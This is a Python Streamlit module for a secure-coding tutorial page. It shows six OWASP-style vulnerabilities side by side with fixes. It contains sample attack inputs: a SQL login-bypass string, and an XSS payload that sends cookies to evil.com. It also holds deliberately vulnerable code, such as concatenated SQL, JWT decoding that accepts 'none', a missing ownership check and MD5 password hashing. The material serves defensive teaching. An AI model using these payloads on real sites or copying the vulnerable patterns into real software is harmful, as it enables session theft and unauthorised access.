"""
Secure Coding Examples module.
Shows vulnerable code, attack explanation, and fixed code side-by-side.
"""
from __future__ import annotations
import streamlit as st
from page_modules.shared_styles import inject_css, page_header, section_heading

SECURE_CODING_EXAMPLES = [
    {
        "id": "SC-001", "title": "SQL Injection",
        "category": "Injection", "severity": "Critical", "colour": "#FF2D2D",
        "owasp": "A03:2021",
        "description": "SQL injection occurs when user input is concatenated directly into SQL queries, allowing attackers to manipulate the query logic.",
        "attack_scenario": "An attacker enters `' OR '1'='1` as the username, which makes the WHERE clause always true, granting access without a valid password.",
        "vulnerable_code": """# ❌ VULNERABLE — SQL Injection
import sqlite3

def get_user(username, password):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # DANGEROUS: String concatenation
    query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
    
    cursor.execute(query)
    return cursor.fetchone()

# Attack input:
# username = "' OR '1'='1"
# password = "anything"
# Resulting query: SELECT * FROM users WHERE username='' OR '1'='1' AND password='anything'
# This returns ALL users!""",
        "fixed_code": """# ✅ FIXED — Parameterized Queries
import sqlite3
import bcrypt

def get_user(username: str, password: str):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # SAFE: Parameterized query — inputs never interpreted as SQL
    query = "SELECT id, username, password_hash FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    user = cursor.fetchone()
    
    if user and bcrypt.checkpw(password.encode(), user[2]):
        return user
    return None  # Invalid credentials

# Attack input ' OR '1'='1 is treated as literal string, not SQL""",
        "language": "python",
        "mitigation_steps": ["Use parameterized queries or prepared statements", "Use an ORM (SQLAlchemy, Django ORM)", "Validate and whitelist input", "Apply principle of least privilege to DB user", "Use stored procedures with parameters"],
    },
    {
        "id": "SC-002", "title": "Cross-Site Scripting (XSS)",
        "category": "Injection", "severity": "High", "colour": "#FF8C00",
        "owasp": "A03:2021",
        "description": "XSS allows attackers to inject malicious scripts into web pages viewed by other users.",
        "attack_scenario": "Attacker posts a comment containing `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`, stealing session cookies of all users who view the comment.",
        "vulnerable_code": r"""# ❌ VULNERABLE — Reflected XSS in Flask
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')
    
    # DANGEROUS: Direct injection into HTML — no escaping!
    return (
        "<html><body>"
        "<h1>Search results for: " + query + "</h1>"
        "</body></html>"
    )

# Attack URL: /search?q=<script>alert(document.cookie)</script>
# Executes malicious JS in victim's browser""",
        "fixed_code": r"""# ✅ FIXED — Output Encoding + Content Security Policy
from flask import Flask, request
from markupsafe import Markup, escape as safe_escape

app = Flask(__name__)

@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # SAFE: Escape HTML special characters before rendering
    safe_query = safe_escape(query)
    html = (
        "<html><head><meta charset='utf-8'></head><body>"
        "<h1>Search results for: " + str(safe_query) + "</h1>"
        "</body></html>"
    )
    return Markup(html)""",
        "language": "python",
        "mitigation_steps": ["Escape all output (HTML, JS, URL, CSS contexts)", "Use templating engines with auto-escaping (Jinja2)", "Implement Content Security Policy headers", "Use HTTPOnly and Secure cookie flags", "Validate input on the server side"],
    },
    {
        "id": "SC-003", "title": "Hardcoded Secrets",
        "category": "Cryptographic Failure", "severity": "Critical", "colour": "#FF2D2D",
        "owasp": "A02:2021",
        "description": "Hardcoding secrets (API keys, passwords, private keys) in source code exposes them to anyone with code access, including via Git history.",
        "attack_scenario": "Developer commits `SECRET_KEY = 'mysupersecretkey123'` to GitHub. Attacker finds it via code search, uses it to forge JWT tokens and gains admin access.",
        "vulnerable_code": """# ❌ VULNERABLE — Hardcoded Secrets
import jwt
import boto3

# DANGEROUS: Secrets hardcoded directly in source
DATABASE_PASSWORD = "admin123!"
JWT_SECRET = "my-super-secret-jwt-key-2024"
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
STRIPE_KEY = "sk_live_abc123xyz456"

def create_token(user_id):
    return jwt.encode(
        {"user_id": user_id},
        JWT_SECRET,  # Exposed in source code!
        algorithm="HS256"
    )

# Anyone with repo access has all your secrets
# Git history retains them even after deletion!""",
        "fixed_code": """# ✅ FIXED — Environment Variables + Secrets Manager
import os
import jwt
import boto3
from dotenv import load_dotenv  # pip install python-dotenv

# Load from .env file (never committed to git)
load_dotenv()

# Secrets from environment — not in code
DATABASE_PASSWORD = os.environ["DATABASE_PASSWORD"]  # Raises if missing
JWT_SECRET = os.environ.get("JWT_SECRET")
if not JWT_SECRET:
    raise ValueError("JWT_SECRET environment variable is required")

# For production: use AWS Secrets Manager / HashiCorp Vault
def get_secret_from_vault(secret_name: str) -> str:
    client = boto3.client('secretsmanager', region_name='us-east-1')
    response = client.get_secret_value(SecretId=secret_name)
    return response['SecretString']

def create_token(user_id: int) -> str:
    return jwt.encode(
        {"user_id": user_id},
        JWT_SECRET,  # Loaded from env, not hardcoded
        algorithm="HS256"
    )

# .env file (add to .gitignore!):
# DATABASE_PASSWORD=your_actual_password
# JWT_SECRET=your_random_256bit_key""",
        "language": "python",
        "mitigation_steps": ["Use environment variables for all secrets", "Use secrets managers (AWS SM, HashiCorp Vault, Azure KV)", "Add .env to .gitignore immediately", "Scan commits with git-secrets or truffleHog", "Rotate any secrets already committed", "Use short-lived credentials where possible"],
    },
    {
        "id": "SC-004", "title": "Broken Authentication — Weak JWT",
        "category": "Authentication Failure", "severity": "Critical", "colour": "#FF2D2D",
        "owasp": "A07:2021",
        "description": "Weak JWT implementation — accepting 'none' algorithm, weak secrets, or missing expiry — allows token forgery.",
        "attack_scenario": "API accepts `alg: none` JWT tokens. Attacker modifies their token to claim admin role, changes algorithm to 'none', and server accepts it without verification.",
        "vulnerable_code": """# ❌ VULNERABLE — Weak JWT Implementation
import jwt

SECRET = "weak"  # Too short, guessable

def create_token(user_id, role):
    # No expiry! Token valid forever
    return jwt.encode({"user_id": user_id, "role": role}, SECRET)

def verify_token(token):
    try:
        # DANGEROUS: accepts ANY algorithm including 'none'
        payload = jwt.decode(token, SECRET, algorithms=["HS256", "none", "RS256"])
        return payload
    except:
        return None  # Silent failure — returns None instead of raising

# Attack 1: Forge token with alg=none
# Attack 2: Brute force "weak" secret (1-4 chars)
# Attack 3: Token never expires — replay attacks""",
        "fixed_code": """# ✅ FIXED — Secure JWT Implementation
import jwt
import secrets
import os
from datetime import datetime, timedelta, timezone
from typing import Optional

# Strong secret: 256-bit random key from environment
JWT_SECRET = os.environ["JWT_SECRET"]  # e.g., secrets.token_hex(32)
JWT_ALGORITHM = "HS256"  # Explicitly whitelist ONE algorithm
ACCESS_TOKEN_EXPIRY = timedelta(minutes=15)  # Short-lived
REFRESH_TOKEN_EXPIRY = timedelta(days=7)

def create_access_token(user_id: int, role: str) -> str:
    now = datetime.now(timezone.utc)
    payload = {
        "sub": str(user_id),      # Subject (user ID)
        "role": role,
        "iat": now,                # Issued at
        "exp": now + ACCESS_TOKEN_EXPIRY,  # Expiry!
        "jti": secrets.token_hex(16),      # Unique ID (prevent replay)
        "type": "access",
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)

def verify_token(token: str) -> Optional[dict]:
    try:
        # SAFE: Only allow HS256 — 'none' and RS256 rejected
        payload = jwt.decode(
            token,
            JWT_SECRET,
            algorithms=[JWT_ALGORITHM],  # Whitelist only
            options={"require": ["exp", "iat", "sub"]},  # Require claims
        )
        if payload.get("type") != "access":
            return None
        return payload
    except jwt.ExpiredSignatureError:
        raise ValueError("Token has expired")
    except jwt.InvalidTokenError as e:
        raise ValueError(f"Invalid token: {e}")""",
        "language": "python",
        "mitigation_steps": ["Use strong random secrets (256-bit minimum)", "Whitelist allowed algorithms explicitly", "Set short expiry (15 min access, 7 day refresh)", "Include jti claim to prevent replay", "Use RS256 for public-facing APIs", "Validate all required claims on decode"],
    },
    {
        "id": "SC-005", "title": "Insecure Direct Object Reference (IDOR)",
        "category": "Broken Access Control", "severity": "High", "colour": "#FF8C00",
        "owasp": "A01:2021",
        "description": "IDOR allows users to access objects they don't own by directly modifying a reference (ID) in a request.",
        "attack_scenario": "User 123 accesses `/api/orders/456` and sees order belonging to User 456. By incrementing the ID, they can read all orders in the system.",
        "vulnerable_code": """# ❌ VULNERABLE — IDOR in API endpoint
from flask import Flask, jsonify, request

app = Flask(__name__)

@app.route('/api/orders/<int:order_id>')
def get_order(order_id):
    # DANGEROUS: No ownership check!
    # Any authenticated user can access ANY order
    order = db.query("SELECT * FROM orders WHERE id = ?", order_id)
    
    if order:
        return jsonify(order)
    return jsonify({"error": "Not found"}), 404

# User 123 can access:
# /api/orders/1    → User 1's order ✓
# /api/orders/999  → User 999's order (unauthorized!)""",
        "fixed_code": """# ✅ FIXED — Ownership Verification
from flask import Flask, jsonify, request, g
from functools import wraps
import jwt
import os

app = Flask(__name__)

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')
        try:
            payload = jwt.decode(token, os.environ['JWT_SECRET'], algorithms=['HS256'])
            g.user_id = int(payload['sub'])
            g.user_role = payload.get('role', 'user')
        except Exception:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

@app.route('/api/orders/<int:order_id>')
@require_auth
def get_order(order_id: int):
    # SAFE: Always verify ownership in query
    if g.user_role == 'admin':
        # Admins can access any order
        order = db.query("SELECT * FROM orders WHERE id = ?", (order_id,))
    else:
        # Regular users: include user_id in WHERE clause
        order = db.query(
            "SELECT * FROM orders WHERE id = ? AND user_id = ?",
            (order_id, g.user_id)  # OWNERSHIP CHECK
        )
    
    if order:
        return jsonify(order)
    # Return 404 even if exists but unauthorized (don't reveal existence)
    return jsonify({"error": "Not found"}), 404""",
        "language": "python",
        "mitigation_steps": ["Always verify resource ownership in DB query", "Include user_id in WHERE clause, not just in WHERE id=?", "Use UUIDs instead of sequential IDs", "Return 404 (not 403) to avoid revealing existence", "Log all access control failures", "Implement per-object access control lists (ACL)"],
    },
    {
        "id": "SC-006", "title": "Password Storage — Bcrypt vs Plaintext",
        "category": "Cryptographic Failure", "severity": "Critical", "colour": "#FF2D2D",
        "owasp": "A02:2021",
        "description": "Storing passwords in plaintext or with weak hashing (MD5, SHA1) means a database breach exposes all user passwords immediately.",
        "attack_scenario": "Database breached. Attacker downloads user table. If MD5 hashed: rainbow tables crack 80%+ of passwords in minutes. If bcrypt: cracking is computationally infeasible.",
        "vulnerable_code": """# ❌ VULNERABLE — Plaintext and Weak Hashing
import hashlib
import sqlite3

def register_user_bad(username, password):
    # TERRIBLE: Storing password in plaintext
    db.execute("INSERT INTO users (username, password) VALUES (?, ?)",
               (username, password))

def register_user_weak(username, password):
    # WEAK: MD5 is broken — rainbow tables crack it instantly
    hashed = hashlib.md5(password.encode()).hexdigest()
    db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
               (username, hashed))

def login_weak(username, password):
    hashed = hashlib.md5(password.encode()).hexdigest()
    user = db.fetchone("SELECT * FROM users WHERE username=? AND password_hash=?",
                       (username, hashed))
    return user is not None""",
        "fixed_code": """# ✅ FIXED — bcrypt with work factor
import bcrypt
import secrets
import os

BCRYPT_ROUNDS = 12  # Work factor — increase as hardware improves

def hash_password(password: str) -> str:
    \"\"\"Hash password using bcrypt with automatic salt.\"\"\"
    # bcrypt automatically generates and embeds a random salt
    salt = bcrypt.gensalt(rounds=BCRYPT_ROUNDS)
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed.decode('utf-8')

def verify_password(password: str, hashed: str) -> bool:
    \"\"\"Safely verify password — constant-time comparison (no timing attacks).\"\"\"
    try:
        return bcrypt.checkpw(password.encode('utf-8'), hashed.encode('utf-8'))
    except Exception:
        return False

def register_user(username: str, password: str) -> bool:
    # Validate password strength first
    if len(password) < 12:
        raise ValueError("Password must be at least 12 characters")
    
    password_hash = hash_password(password)
    db.execute(
        "INSERT INTO users (username, password_hash) VALUES (?, ?)",
        (username, password_hash)
    )
    return True

def login(username: str, password: str) -> bool:
    user = db.fetchone(
        "SELECT password_hash FROM users WHERE username = ?", (username,)
    )
    if not user:
        # Perform dummy check to prevent timing attacks
        bcrypt.checkpw(b"dummy", bcrypt.hashpw(b"dummy", bcrypt.gensalt()))
        return False
    return verify_password(password, user['password_hash'])

# For new systems: consider Argon2id (even stronger)
# pip install argon2-cffi""",
        "language": "python",
        "mitigation_steps": ["Use bcrypt (rounds≥12), Argon2id, or scrypt", "Never use MD5/SHA1/SHA256 for passwords", "bcrypt handles salt automatically", "Add timing-attack protection (dummy hash check)", "Enforce minimum password length (12+ chars)", "Migrate existing weak hashes on next login"],
    },
]


def show() -> None:
    inject_css()
    page_header("💻", "Secure Coding Examples",
                "Side-by-side vulnerable vs. fixed code with attack explanations.")

    # Stats
    cats = list({e["category"] for e in SECURE_CODING_EXAMPLES})
    m1, m2, m3 = st.columns(3)
    m1.metric("Examples", len(SECURE_CODING_EXAMPLES))
    m2.metric("Categories", len(cats))
    m3.metric("Critical Issues", sum(1 for e in SECURE_CODING_EXAMPLES if e["severity"] == "Critical"))

    section_heading("Filter Examples")
    f1, f2 = st.columns(2)
    sel_cat = f1.selectbox("Category", ["All"] + sorted(cats))
    sel_sev = f2.selectbox("Severity", ["All", "Critical", "High", "Medium"])

    filtered = SECURE_CODING_EXAMPLES
    if sel_cat != "All":
        filtered = [e for e in filtered if e["category"] == sel_cat]
    if sel_sev != "All":
        filtered = [e for e in filtered if e["severity"] == sel_sev]

    st.markdown(f"**Showing {len(filtered)} of {len(SECURE_CODING_EXAMPLES)} examples**")
    st.markdown("<br>", unsafe_allow_html=True)

    for ex in filtered:
        sev_colour = {"Critical": "#FF2D2D", "High": "#FF8C00",
                      "Medium": "#FFD700", "Low": "#00C853"}.get(ex["severity"], "#aaa")
        with st.expander(
            f"💥 **{ex['title']}** — {ex['category']} | {ex['severity']} | {ex['owasp']}",
            expanded=False
        ):
            # Header info
            c1, c2, c3, c4 = st.columns(4)
            c1.markdown(f"**ID:** `{ex['id']}`")
            c2.markdown(f"**Category:** {ex['category']}")
            c3.markdown(f"**Severity:** <span style='color:{sev_colour};font-weight:700'>{ex['severity']}</span>",
                        unsafe_allow_html=True)
            c4.markdown(f"**OWASP:** `{ex['owasp']}`")

            st.markdown(f"**📖 Description:** {ex['description']}")
            st.markdown(f"""
<div style="background:#2d0f0f; border-left:4px solid #FF2D2D;
            padding:12px 16px; border-radius:0 8px 8px 0; margin:12px 0;">
  <b style="color:#FF6B6B">⚠️ Attack Scenario:</b><br>
  <span style="color:#e5e7eb; font-size:0.9rem;">{ex['attack_scenario']}</span>
</div>
""", unsafe_allow_html=True)

            # Code comparison
            t1, t2, t3 = st.tabs(["❌ Vulnerable Code", "✅ Fixed Code", "🛡️ Mitigations"])

            with t1:
                st.markdown("""
<div style="background:#2d0f0f; border:1px solid #FF2D2D44;
            border-radius:8px; padding:8px 12px; margin-bottom:8px;">
  <span style="color:#FF6B6B; font-weight:700;">⚠️ DO NOT USE THIS CODE IN PRODUCTION</span>
</div>
""", unsafe_allow_html=True)
                st.code(ex["vulnerable_code"], language=ex["language"])

            with t2:
                st.markdown("""
<div style="background:#0d2d1a; border:1px solid #00C85344;
            border-radius:8px; padding:8px 12px; margin-bottom:8px;">
  <span style="color:#00C853; font-weight:700;">✅ PRODUCTION-READY SECURE CODE</span>
</div>
""", unsafe_allow_html=True)
                st.code(ex["fixed_code"], language=ex["language"])

            with t3:
                for i, step in enumerate(ex["mitigation_steps"], 1):
                    st.markdown(f"**{i}.** {step}")
